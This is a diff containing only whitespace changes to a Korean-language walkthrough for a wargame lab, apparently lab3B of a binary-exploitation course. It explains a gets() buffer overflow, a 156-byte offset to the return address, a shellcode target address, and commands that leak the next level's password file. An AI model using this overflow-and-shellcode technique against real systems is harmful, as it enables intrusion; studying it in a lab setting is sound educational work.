@@ -79,7 +79,7 @@
 - 힌트를 보면 .pass 파일을 열고 읽는 쉘코드를 사용하라고 가이드
 ```c
 	/* hint: write shellcode that opens and reads the .pass file.
-		ptrace() is meant to deter you from using /bin/sh shellcode */
+	ptrace() is meant to deter you from using /bin/sh shellcode */
 ```
 - 부모 프로세스는 ptrace() 함수를 통해 자식 프로세스의 exec 시스템콜은 실행하지 못하도록 필터링
 ```c
@@ -98,7 +98,7 @@
 ```
 - 자식 프로세스의 경우, buffer 사이즈가 128byte이지만 gets()함수에서 입력값 제한이 없으므로 overflow 발생
 ```c
-	char buffer[128] = {0};
+  char buffer[128] = {0};
   ...
   puts("just give me some shellcode, k");
   gets(buffer);
@@ -127,14 +127,14 @@
 
 	Program received signal SIGSEGV, Segmentation fault.
 	...
-  Stopped reason: SIGSEGV
+        Stopped reason: SIGSEGV
 	0x48484848 in ?? ()
 	gdb-peda$
 ```
 ```
 	|-------------------- 156 byte -------------------|
 	[aaaaaaaa...aaaaaaaa][AAAABBBBCCCCDDDDEEEEFFFFGGGG][HHHH]
-        buffer(128)               dummy(28)            ret
+             buffer(128)               dummy(28)            ret
 ```
 - crash 발생 시점의 buffer 변수의 주소는 0xbffff640 이므로, 해당 위치에 쉘코드를 입력하고 리턴주소로 사용하면 쉘코드 실행 가능
 ```
@@ -150,7 +150,7 @@
 	ESP: 0xbffff6e0 ("IIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ")
 	EIP: 0x48484848 ('HHHH')
 	EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
-  ...
+        ...
 ```
 ```
 	gdb-peda$ x/s 0xbffff640
@@ -174,7 +174,7 @@
 	lab3B@warzone:/levels/lab03$ python /tmp/lab3b.py > /tmp/lab3b_input
 	lab3B@warzone:/levels/lab03$ ./lab3B < /tmp/lab3b_input
 	just give me some shellcode, k
-  [/home/lab3A/.pass 파일 내용 출력]
-  child is exiting...
+        [/home/lab3A/.pass 파일 내용 출력]
+        child is exiting...
 	lab3B@warzone:/levels/lab03$
 ```
